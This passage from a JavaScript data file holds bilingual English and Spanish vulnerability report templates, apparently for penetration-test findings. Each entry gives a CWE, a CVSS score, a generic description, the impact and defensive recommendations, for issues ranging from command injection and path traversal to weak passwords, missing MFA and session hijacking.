      impact_en: "### Impact\nA successful RCE attack gives an attacker full control over the compromised system, allowing them to steal data, install malware, or use the system as a pivot point for further attacks.",
      impact_es: "### Impacto\nUn ataque RCE exitoso le da a un atacante el control total sobre el sistema comprometido, lo que le permite robar datos, instalar malware o usar el sistema como punto de pivote para más ataques.",
      recommendations_en: "### Recommendations\nFollow secure coding practices. Keep all software and dependencies patched. Implement strict input validation. Use a web application firewall (WAF) as a defense-in-depth measure.",
      recommendations_es: "### Recomendaciones\nSeguir prácticas de codificación segura. Mantener todo el software y las dependencias parcheadas. Implementar una validación de entrada estricta. Usar un cortafuegos de aplicaciones web (WAF) como medida de defensa en profundidad.",
      references: ["https://www.imperva.com/learn/application-security/remote-code-execution-rce/"],
      tags: ["Infrastructure", "RCE"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-038",
      title_en: "Privilege Escalation",
      title_es: "Escalada de Privilegios",
      cwe: "CWE-269",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "L", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nPrivilege escalation is the act of exploiting a bug, design flaw, or configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user.",
      overview_es: "### Resumen\nLa escalada de privilegios es el acto de explotar un error, un fallo de diseño o una supervisión de configuración en un sistema operativo o aplicación de software para obtener acceso elevado a recursos que normalmente están protegidos de una aplicación o usuario.",
      technicalDescription_en: "### Technical Description\nThis can be achieved through various means, such as exploiting a vulnerable SUID binary (on Linux), a misconfigured service running as a privileged user, or an unpatched kernel vulnerability. The goal is to move from a low-privilege user to a high-privilege one (e.g., root or SYSTEM).",
      technicalDescription_es: "### Descripción Técnica\nEsto se puede lograr a través de varios medios, como explotar un binario SUID vulnerable (en Linux), un servicio mal configurado que se ejecuta como un usuario privilegiado o una vulnerabilidad del kernel sin parches. El objetivo es pasar de un usuario de bajos privilegios a uno de altos privilegios (p. ej., root o SYSTEM).",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the vector used for privilege escalation, e.g., a specific SUID binary, a vulnerable kernel version.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el vector utilizado para la escalada de privilegios, p. ej., un binario SUID específico, una versión vulnerable del kernel.]",
      impact_en: "### Impact\nAn attacker with administrative privileges has full control over the system.",
      impact_es: "### Impacto\nUn atacante con privilegios administrativos tiene el control total sobre el sistema.",
      recommendations_en: "### Recommendations\nApply the principle of least privilege. Keep systems patched. Regularly audit for misconfigurations, such as insecure file permissions or SUID binaries.",
      recommendations_es: "### Recomendaciones\nAplicar el principio de privilegio mínimo. Mantener los sistemas parcheados. Auditar regularmente en busca de configuraciones incorrectas, como permisos de archivo inseguros o binarios SUID.",
      references: ["https://www.crowdstrike.com/cybersecurity-101/privilege-escalation/"],
      tags: ["Infrastructure", "Privilege Escalation"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-039",
      title_en: "Information Disclosure",
      title_es: "Divulgación de Información",
      cwe: "CWE-200",
      severity: "Medium",
      cvss: { score: 5.3, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "N", availability: "N" },
      overview_en: "### Overview\nThe application leaks sensitive information that can aid an attacker in launching further attacks. This information can include software versions, internal IP addresses, usernames, or error details.",
      overview_es: "### Resumen\nLa aplicación filtra información sensible que puede ayudar a un atacante a lanzar más ataques. Esta información puede incluir versiones de software, direcciones IP internas, nombres de usuario o detalles de errores.",
      technicalDescription_en: "### Technical Description\nThis often occurs through verbose error messages, server headers (e.g., Server: Apache/2.4.29), or debug information left in the code. An attacker can gather this information to build a profile of the system and identify potential vulnerabilities.",
      technicalDescription_es: "### Descripción Técnica\nEsto ocurre a menudo a través de mensajes de error detallados, cabeceras del servidor (p. ej., Server: Apache/2.4.29) o información de depuración dejada en el código. Un atacante puede recopilar esta información para construir un perfil del sistema e identificar vulnerabilidades potenciales.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the source of the information disclosure, e.g., HTTP headers, error pages, source code comments.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la fuente de la divulgación de información, p. ej., cabeceras HTTP, páginas de error, comentarios en el código fuente.]",
      impact_en: "### Impact\nWhile not directly exploitable, information disclosure makes it easier for an attacker to find and exploit other vulnerabilities.",
      impact_es: "### Impacto\nAunque no es directamente explotable, la divulgación de información facilita que un atacante encuentre y explote otrasulnerabilidades.",
      recommendations_en: "### Recommendations\nConfigure the application to return generic error messages. Remove or obfuscate server banners and version information. Sanitize the code to remove any sensitive comments or debug information.",
      recommendations_es: "### Recomendaciones\nConfigurar la aplicación para que devuelva mensajes de error genéricos. Eliminar u ofuscar los banners del servidor y la información de la versión. Desinfectar el código para eliminar cualquier comentario sensible o información de depuración.",
      references: ["https://owasp.org/www-community/attacks/Information_Leakage"],
      tags: ["Infrastructure", "Information Disclosure"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-040",
      title_en: "Command Injection",
      title_es: "Inyección de Comandos",
      cwe: "CWE-77",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nCommand injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell.",
      overview_es: "### Resumen\nLa inyección de comandos es un ataque en el que el objetivo es la ejecución de comandos arbitrarios en el sistema operativo anfitrión a través de una aplicación vulnerable. Los ataques de inyección de comandos son posibles cuando una aplicación pasa datos no seguros suministrados por el usuario (formularios, cookies, cabeceras HTTP, etc.) a un shell del sistema.",
      technicalDescription_en: "### Technical Description\nThe application uses user input to build a command that is executed on the server. An attacker can inject shell metacharacters (e.g., `;`, `|`, `&&`) to append additional commands to the original one.",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación utiliza la entrada del usuario para construir un comando que se ejecuta en el servidor. Un atacante puede inyectar metacaracteres de shell (p. ej., `;`, `|`, `&&`) para añadir comandos adicionales al original.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the vulnerable parameter and functionality, e.g., the `filename` parameter in a file conversion tool that uses a shell command.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el parámetro y la funcionalidad vulnerables, p. ej., el parámetro `filename` en una herramienta de conversión de archivos que utiliza un comando de shell.]",
      impact_en: "### Impact\nThis can lead to remote code execution with the privileges of the web server process, potentially leading to a full system compromise.",
      impact_es: "### Impacto\nEsto puede conducir a la ejecución remota de código con los privilegios del proceso del servidor web, lo que podría llevar a un compromiso total del sistema.",
      recommendations_en: "### Recommendations\nAvoid calling out to shell commands if at all possible. Use built-in library functions instead. If necessary, strictly validate user input using a whitelist of allowed values. Sanitize input to escape shell metacharacters.",
      recommendations_es: "### Recomendaciones\nEvitar llamar a comandos de shell si es posible. Usar funciones de biblioteca integradas en su lugar. Si es necesario, validar estrictamente la entrada del usuario utilizando una lista blanca de valores permitidos. Desinfectar la entrada para escapar los metacaracteres de shell.",
      references: ["https://owasp.org/www-community/attacks/Command_Injection"],
      tags: ["Infrastructure", "Injection"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-041",
      title_en: "Path Traversal",
      title_es: "Salto de Ruta",
      cwe: "CWE-22",
      severity: "High",
      cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nPath traversal (also known as directory traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application.",
      overview_es: "### Resumen\nEl salto de ruta (también conocido como salto de directorio) es una vulnerabilidad de seguridad web que permite a un atacante leer archivos arbitrarios en el servidor que está ejecutando una aplicación.",
      technicalDescription_en: "### Technical Description\nThe application uses user-supplied input to construct a path to a file. An attacker can use path traversal sequences like `../` to navigate up the directory tree and access files outside of the intended directory.",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación utiliza la entrada proporcionada por el usuario para construir una ruta a un archivo. Un atacante puede usar secuencias de salto de directorio como `../` para acceder a archivos fuera del directorio previsto.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the vulnerable parameter and functionality, e.g., the `filename` parameter in a file download feature.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el parámetro y la funcionalidad vulnerables, p. ej., el parámetro `filename` en una función de descarga de archivos.]",
      impact_en: "### Impact\nThis can lead to the disclosure of sensitive information, such as source code, credentials, and system configuration files.",
      impact_es: "### Impacto\nEsto puede conducir a la divulgación de información sensible, como el código fuente, las credenciales y los archivos de configuración del sistema.",
      recommendations_en: "### Recommendations\nValidate user input before using it in filesystem operations. Use a whitelist of allowed file paths. Run the application in a sandboxed environment to restrict filesystem access.",
      recommendations_es: "### Recomendaciones\nValidar la entrada del usuario antes de usarla en operaciones del sistema de archivos. Usar una lista blanca de rutas de archivo permitidas. Ejecutar la aplicación en un entorno aislado (sandbox) para restringir el acceso al sistema de archivos.",
      references: ["https://owasp.org/www-community/attacks/Path_Traversal"],
      tags: ["Infrastructure", "File Inclusion"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-042",
      title_en: "Open Redirects",
      title_es: "Redirecciones Abiertas",
      cwe: "CWE-601",
      severity: "Medium",
      cvss: { score: 5.4, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "N" },
      overview_en: "### Overview\nAn open redirect is an application which takes a parameter and redirects a user to that parameter value without any validation. This vulnerability is used in phishing attacks to get users to visit malicious sites without realizing it.",
      overview_es: "### Resumen\nUna redirección abierta es una aplicación que toma un parámetro y redirige a un usuario a ese valor de parámetro sin ninguna validación. Esta vulnerabilidad se utiliza en ataques de phishing para que los usuarios visiten sitios maliciosos sin darse cuenta.",
      technicalDescription_en: "### Technical Description\nThe application uses a parameter (e.g., `?redirect=...`) to redirect the user after an action. An attacker can craft a URL with a malicious destination in this parameter. When a victim clicks the link, they are redirected to the attacker's site, but the URL appears to be for the legitimate application, making the phishing attempt more convincing.",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación utiliza un parámetro (p. ej., `?redirect=...`) para redirigir al usuario después de una acción. Un atacante puede crear una URL con un destino malicioso en este parámetro. Cuando una víctima hace clic en el enlace, es redirigida al sitio del atacante, pero la URL parece ser de la aplicación legítima, lo que hace que el intento de phishing sea más convincente.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the vulnerable URL and parameter, e.g., `/login?redirect=...`]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la URL y el parámetro vulnerables, p. ej., `/login?redirect=...`]",
      impact_en: "### Impact\nThis vulnerability facilitates phishing attacks, which can lead to credential theft and other social engineering attacks.",
      impact_es: "### Impacto\nEsta vulnerabilidad facilita los ataques de phishing, que pueden conducir al robo de credenciales y otros ataques de ingeniería social.",
      recommendations_en: "### Recommendations\nAvoid using redirects. If necessary, use a whitelist of allowed redirect destinations. Do not allow the user to control the entire redirect URL.",
      recommendations_es: "### Recomendaciones\nEvitar el uso de redirecciones. Si es necesario, usar una lista blanca de destinos de redirección permitidos. No permitir que el usuario controle toda la URL de redirección.",
      references: ["https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"],
      tags: ["Web", "Redirect"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-043",
      title_en: "Insecure File Shares",
      title_es: "Recursos Compartidos de Archivos Inseguros",
      cwe: "CWE-276",
      severity: "High",
      cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nNetwork file shares (e.g., SMB, NFS) are configured with weak or no access controls, allowing unauthorized users to access, modify, or delete files.",
      overview_es: "### Resumen\nLos recursos compartidos de archivos de red (p. ej., SMB, NFS) están configurados con controles de acceso débiles o nulos, lo que permite a usuarios no autorizados acceder, modificar o eliminar archivos.",
      technicalDescription_en: "### Technical Description\nA file share is configured to allow 'Everyone' or 'Anonymous' access with read or write permissions. An attacker on the network can connect to the share and access its contents without authentication.",
      technicalDescription_es: "### Descripción Técnica\nUn recurso compartido de archivos está configurado para permitir el acceso de 'Todos' o 'Anónimo' con permisos de lectura o escritura. Un atacante en la red puede conectarse al recurso compartido y acceder a su contenido sin autenticación.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the path to the insecure file share, e.g., `\\\\SERVER\\share`.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la ruta al recurso compartido de archivos inseguro, p. ej., `\\\\SERVIDOR\\recurso`.]",
      impact_en: "### Impact\nThis can lead to the exposure of sensitive data, intellectual property, or provide a means for an attacker to plant malware.",
      impact_es: "### Impacto\nEsto puede llevar a la exposición de datos sensibles, propiedad intelectual o proporcionar un medio para que un atacante plante malware.",
      recommendations_en: "### Recommendations\nApply the principle of least privilege to all file shares. Remove 'Everyone' and 'Anonymous' access. Use strong authentication and restrict access to authorized user groups.",
      recommendations_es: "### Recomendaciones\nAplicar el principio de privilegio mínimo a todos los recursos compartidos de archivos. Eliminar el acceso de 'Todos' y 'Anónimo'. Usar autenticación fuerte y restringir el acceso a grupos de usuarios autorizados.",
      references: ["https://www.stigviewer.com/stig/windows_10/2021-08-18/finding/V-63453"],
      tags: ["Infrastructure", "File Share"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-044",
      title_en: "Sensitive Data on File Shares",
      title_es: "Datos Sensibles en Recursos Compartidos",
      cwe: "CWE-312",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nSensitive information, such as passwords, configuration files with credentials, or backups, are stored on accessible network file shares.",
      overview_es: "### Resumen\nLa información sensible, como contraseñas, archivos de configuración con credenciales o copias de seguridad, se almacena en recursos compartidos de archivos de red accesibles.",
      technicalDescription_en: "### Technical Description\nDuring a scan of network shares, files containing sensitive data were discovered. This data can be directly used by an attacker to escalate privileges or access other systems.",
      technicalDescription_es: "### Descripción Técnica\nDurante un escaneo de los recursos compartidos de red, se descubrieron archivos que contenían datos sensibles. Estos datos pueden ser utilizados directamente por un atacante para escalar privilegios o acceder a otros sistemas.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the path to the sensitive file(s) on the share, e.g., `\\\\SERVER\\share\\config.ini` containing a password.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la ruta al/los archivo(s) sensible(s) en el recurso compartido, p. ej., `\\\\SERVIDOR\\recurso\\config.ini` que contiene una contraseña.]",
      impact_en: "### Impact\nThis can lead to immediate compromise of accounts and systems, providing an attacker with credentials to move laterally within the network.",
      impact_es: "### Impacto\nEsto puede conducir al compromiso inmediato de cuentas y sistemas, proporcionando a un atacante las credenciales para moverse lateralmente dentro de la red.",
      recommendations_en: "### Recommendations\nDo not store sensitive information on file shares. If necessary, encrypt the files and strictly control access. Regularly audit file shares for sensitive content.",
      recommendations_es: "### Recomendaciones\nNo almacenar información sensible en recursos compartidos de archivos. Si es necesario, cifrar los archivos y controlar estrictamente el acceso. Auditar regularmente los recursos compartidos de archivos en busca de contenido sensible.",
      references: ["https://cwe.mitre.org/data/definitions/312.html"],
      tags: ["Infrastructure", "Data"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-045",
      title_en: "Unnecessary Exposed Services",
      title_es: "Servicios Expuestos Innecesariamente",
      cwe: "CWE-920",
      severity: "High",
      cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "N", integrity: "N", availability: "H" },
      overview_en: "### Overview\nServices that are not intended for public access are exposed to the internet. These services increase the attack surface and often have weaker security controls.",
      overview_es: "### Resumen\nLos servicios que no están destinados al acceso público están expuestos a Internet. Estos servicios aumentan la superficie de ataque y a menudo tienen controles de seguridad más débiles.",
      technicalDescription_en: "### Technical Description\nServices like RDP, SMB, or database management ports are open to the internet. An attacker can directly target these services to find vulnerabilities, brute-force credentials, or launch denial-of-service attacks.",
      technicalDescription_es: "### Descripción Técnica\nServicios como RDP, SMB o puertos de gestión de bases de datos están abiertos a Internet. Un atacante puede dirigirse directamente a estos servicios para encontrar vulnerabilidades, forzar credenciales o lanzar ataques de denegación de servicio.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the host and port of the exposed service, e.g., 1.2.3.4:3389 (RDP).]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el host y el puerto del servicio expuesto, p. ej., 1.2.3.4:3389 (RDP).]",
      impact_en: "### Impact\nThis significantly increases the attack surface and provides a direct vector for attackers to compromise internal systems.",
      impact_es: "### Impacto\nEsto aumenta significativamente la superficie de ataque y proporciona un vector directo para que los atacantes comprometan los sistemas internos.",
      recommendations_en: "### Recommendations\nRestrict access to all management and internal services using a firewall. If remote access is required, use a secure VPN with multi-factor authentication.",
      recommendations_es: "### Recomendaciones\nRestringir el acceso a todos los servicios de gestión e internos utilizando un cortafuegos. Si se requiere acceso remoto, usar una VPN segura con autenticación multifactor.",
      references: ["https://www.shodan.io/"],
      tags: ["Infrastructure", "Configuration"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-046",
      title_en: "Misconfigured <APPLICATION> Instance",
      title_es: "Instancia de <APPLICATION> Mal Configurada",
      cwe: "CWE-16",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nThe <APPLICATION> instance is misconfigured, leading to potential security vulnerabilities such as information disclosure, unauthorized access, or remote code execution.",
      overview_es: "### Resumen\nLa instancia de <APPLICATION> está mal configurada, lo que lleva a posibles vulnerabilidades de seguridad como la divulgación de información, el acceso no autorizado o la ejecución remota de código.",
      technicalDescription_en: "### Technical Description\n[TODO: Describe the specific misconfiguration. Examples: default credentials, public dashboards in Kibana, anonymous access to Jenkins, exposed .git directory.]",
      technicalDescription_es: "### Descripción Técnica\n[TODO: Describir la configuración incorrecta específica. Ejemplos: credenciales predeterminadas, paneles públicos en Kibana, acceso anónimo a Jenkins, directorio .git expuesto.]",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the URL or IP address of the misconfigured application instance.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la URL o dirección IP de la instancia de la aplicación mal configurada.]",
      impact_en: "### Impact\nThe impact varies depending on the application and misconfiguration, but can range from sensitive information disclosure to full system compromise.",
      impact_es: "### Impacto\nEl impacto varía según la aplicación y la configuración incorrecta, pero puede ir desde la divulgación de información sensible hasta el compromiso total del sistema.",
      recommendations_en: "### Recommendations\nFollow the security best practices for <APPLICATION>. Change default credentials, restrict access to authorized users, and disable any unnecessary features.",
      recommendations_es: "### Recomendaciones\nSeguir las mejores prácticas de seguridad para <APPLICATION>. Cambiar las credenciales predeterminadas, restringir el acceso a usuarios autorizados y deshabilitar cualquier característica innecesaria.",
      references: ["https://www.google.com/search?q=security+hardening+for+<APPLICATION>"],
      tags: ["Infrastructure", "Configuration"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-047",
      title_en: "Weak Passwords",
      title_es: "Contraseñas Débiles",
      cwe: "CWE-521",
      severity: "High",
      cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nUser accounts are protected by weak, common, or easily guessable passwords. This allows an attacker to gain unauthorized access through brute-force or password spraying attacks.",
      overview_es: "### Resumen\nLas cuentas de usuario están protegidas por contraseñas débiles, comunes o fáciles de adivinar. Esto permite que un atacante obtenga acceso no autorizado a través de ataques de fuerza bruta o de pulverización de contraseñas.",
      technicalDescription_en: "### Technical Description\nThe application does not enforce a strong password policy, allowing users to set passwords like 'password123' or 'qwerty'. An attacker can use a list of common passwords to attempt to log in to multiple accounts.",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación no impone una política de contraseñas segura, lo que permite a los usuarios establecer contraseñas como 'password123' o 'qwerty'. Un atacante puede usar una lista de contraseñas comunes para intentar iniciar sesión en múltiples cuentas.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the accounts found with weak passwords.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar las cuentas encontradas con contraseñas débiles.]",
      impact_en: "### Impact\nThis can lead to widespread account compromise, data breaches, and further attacks.",
      impact_es: "### Impacto\nEsto puede conducir a un compromiso generalizado de cuentas, violaciones de datos y más ataques.",
      recommendations_en: "### Recommendations\nEnforce a strong password policy (e.g., minimum length, complexity requirements). Implement account lockout mechanisms to slow down brute-force attacks. Educate users on creating strong passwords.",
      recommendations_es: "### Recomendaciones\nImponer una política de contraseñas segura (p. ej., longitud mínima, requisitos de complejidad). Implementar mecanismos de bloqueo de cuentas para ralentizar los ataques de fuerza bruta. Educar a los usuarios sobre la creación de contraseñas seguras.",
      references: ["https://www.nist.gov/itl/applied-cybersecurity/privacy-engineering/collaboration-space/password-puid-guidance"],
      tags: ["Authentication", "Passwords"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-048",
      title_en: "Password Reuse",
      title_es: "Reutilización de Contraseñas",
      cwe: "CWE-262",
      severity: "Medium",
      cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
      overview_en: "### Overview\nUsers, including administrators, reuse the same password across multiple systems. If one system is compromised, the attacker can use the stolen credentials to access other systems.",
      overview_es: "### Resumen\nLos usuarios, incluidos los administradores, reutilizan la misma contraseña en múltiples sistemas. Si un sistema se ve comprometido, el atacante puede usar las credenciales robadas para acceder a otros sistemas.",
      technicalDescription_en: "### Technical Description\nA password discovered on one system (e.g., a development server) was found to be valid for another, more critical system (e.g., a production database).",
      technicalDescription_es: "### Descripción Técnica\nSe descubrió que una contraseña en un sistema (p. ej., un servidor de desarrollo) era válida para otro sistema más crítico (p. ej., una base de datos de producción).",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the accounts and systems where the password was reused.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar las cuentas y sistemas donde se reutilizó la contraseña.]",
      impact_en: "### Impact\nPassword reuse allows an attacker to move laterally across the network and escalate their privileges.",
      impact_es: "### Impacto\nLa reutilización de contraseñas permite a un atacante moverse lateralmente a través de la red y escalar sus privilegios.",
      recommendations_en: "### Recommendations\nImplement a policy that prohibits password reuse. Use a password manager to generate and store unique, complex passwords for each service. Enable multi-factor authentication where possible.",
      recommendations_es: "### Recomendaciones\nImplementar una política que prohíba la reutilización de contraseñas. Usar un gestor de contraseñas para generar y almacenar contraseñas únicas y complejas para cada servicio. Habilitar la autenticación multifactor siempre que sea posible.",
      references: ["https://cwe.mitre.org/data/definitions/262.html"],
      tags: ["Authentication", "Passwords"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-049",
      title_en: "Missing Multi-Factor Authentication (MFA)",
      title_es: "Falta de Autenticación Multifactor (MFA)",
      cwe: "CWE-308",
      severity: "High",
      cvss: { score: 7.1, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "L", availability: "N" },
      overview_en: "### Overview\nCritical systems and applications do not require a second factor of authentication, making them vulnerable to compromise if a user's password is stolen.",
      overview_es: "### Resumen\nLos sistemas y aplicaciones críticos no requieren un segundo factor de autenticación, lo que los hace vulnerables a un compromiso si se roba la contraseña de un usuario.",
      technicalDescription_en: "### Technical Description\nAn attacker who has obtained a user's password through phishing, a data breach, or other means can log in to the application without any further challenge.",
      technicalDescription_es: "### Descripción Técnica\nUn atacante que ha obtenido la contraseña de un usuario a través de phishing, una violación de datos u otros medios puede iniciar sesión en la aplicación sin ningún otro desafío.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the application or service that is missing MFA, e.g., VPN, email, administrative interfaces.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la aplicación o servicio que carece de MFA, p. ej., VPN, correo electrónico, interfaces administrativas.]",
      impact_en: "### Impact\nThis significantly increases the risk of unauthorized access, as an attacker only needs a single factor (the password) to compromise an account.",
      impact_es: "### Impacto\nEsto aumenta significativamente el riesgo de acceso no autorizado, ya que un atacante solo necesita un único factor (la contraseña) para comprometer una cuenta.",
      recommendations_en: "### Recommendations\nEnable MFA for all users, especially for privileged accounts and access to sensitive systems. Use strong MFA methods like FIDO2/WebAuthn or TOTP apps.",
      recommendations_es: "### Recomendaciones\nHabilitar MFA para todos los usuarios, especialmente para las cuentas privilegiadas y el acceso a sistemas sensibles. Usar métodos de MFA fuertes como FIDO2/WebAuthn o aplicaciones TOTP.",
      references: ["https://www.cisa.gov/mfa"],
      tags: ["Authentication", "MFA"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-050",
      title_en: "Race Condition",
      title_es: "Condición de Carrera",
      cwe: "CWE-362",
      severity: "Medium",
      cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:L", attackVector: "N", attackComplexity: "H", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "N", integrity: "H", availability: "L" },
      overview_en: "### Overview\nAn attacker can exploit a flaw in the application's handling of concurrent operations to cause unintended behavior, such as bypassing security checks or corrupting data.",
      overview_es: "### Resumen\nUn atacante puede explotar un fallo en el manejo de operaciones concurrentes de la aplicación para causar un comportamiento no deseado, como eludir controles de seguridad o corromper datos.",
      technicalDescription_en: "### Technical Description\nThe application performs a sequence of operations that are not atomic (e.g., checking a user's balance and then making a withdrawal). An attacker can send multiple requests simultaneously, causing the operations to interleave in an unexpected way. For example, they could submit two withdrawal requests at the same time, and the application might check the balance for both requests before either withdrawal is processed, allowing the user to withdraw more money than they have.",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación realiza una secuencia de operaciones que no son atómicas (p. ej., verificar el saldo de un usuario y luego realizar un retiro). Un atacante puede enviar múltiples solicitudes simultáneamente, haciendo que las operaciones se intercalen de una manera inesperada. Por ejemplo, podrían enviar dos solicitudes de retiro al mismo tiempo, y la aplicación podría verificar el saldo para ambas solicitudes antes de que se procese cualquiera de los retiros, permitiendo al usuario retirar más dinero del que tiene.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the functionality that is vulnerable to a race condition, e.g., transferring funds or using a one-time coupon.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad que es vulnerable a una condición de carrera, p. ej., transferir fondos o usar un cupón de un solo uso.]",
      impact_en: "### Impact\nRace conditions can lead to data corruption, financial loss, and bypass of security logic. The impact is highly dependent on the specific context.",
      impact_es: "### Impacto\nLas condiciones de carrera pueden conducir a la corrupción de datos, pérdidas financieras y la elusión de la lógica de seguridad. El impacto depende en gran medida del contexto específico.",
      recommendations_en: "### Recommendations\nEnsure that sequences of operations that must be atomic are protected by proper locking mechanisms (e.g., database transactions, mutexes, semaphores).",
      recommendations_es: "### Recomendaciones\nAsegurarse de que las secuencias de operaciones que deben ser atómicas estén protegidas por mecanismos de bloqueo adecuados (p. ej., transacciones de base de datos, mutex, semáforos).",
      references: ["https://portswigger.net/web-security/race-conditions"],
      tags: ["Race Condition", "Business Logic"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-051",
      title_en: "Session Hijacking",
      title_es: "Secuestro de Sesión",
      cwe: "CWE-384",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nSession hijacking is an attack where an attacker takes over a valid user session to gain unauthorized access to an application.",
      overview_es: "### Resumen\nEl secuestro de sesión es un ataque en el que un atacante toma el control de una sesión de usuario válida para obtener acceso no autorizado a una aplicación.",
      technicalDescription_en: "### Technical Description\nThis can be achieved by stealing session cookies (e.g., via XSS or packet sniffing) or by predicting session IDs if they are not generated randomly. The attacker then uses the stolen session ID to impersonate the user.",
